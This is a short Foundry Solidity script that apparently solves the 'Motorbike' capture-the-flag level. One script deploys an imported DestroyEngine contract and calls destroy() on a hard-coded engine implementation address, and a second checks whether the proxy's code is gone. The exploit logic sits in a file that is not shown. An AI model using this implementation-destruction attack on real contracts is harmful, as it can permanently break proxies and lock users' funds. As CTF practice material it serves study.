// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import  "../src/25.Motorbike.sol";

contract DestroyEngineScript is Script {
    function setUp() public {}

    function run() public {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(privateKey);

        // address motorbike =0x451CdAf0f145401984c38a5D2Cb73d5b43CeDADF;
        address engine = 0xa4b22Afe9690bc5AbB90f6D7D9B94F7516B13c19;

        // attack
        DestroyEngine destroyEngine = new DestroyEngine();
        destroyEngine.destroy(engine);

        vm.stopBroadcast();
    }
}


contract MotorbikeScript is Script {
    function setUp() public {}

    function run() public {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(privateKey);

        address motorbike =0x451CdAf0f145401984c38a5D2Cb73d5b43CeDADF;

        bytes memory code = motorbike.code;

        if (code.length > 0) {
            console.log("Level not cleared");
        }

        vm.stopBroadcast();
    }
}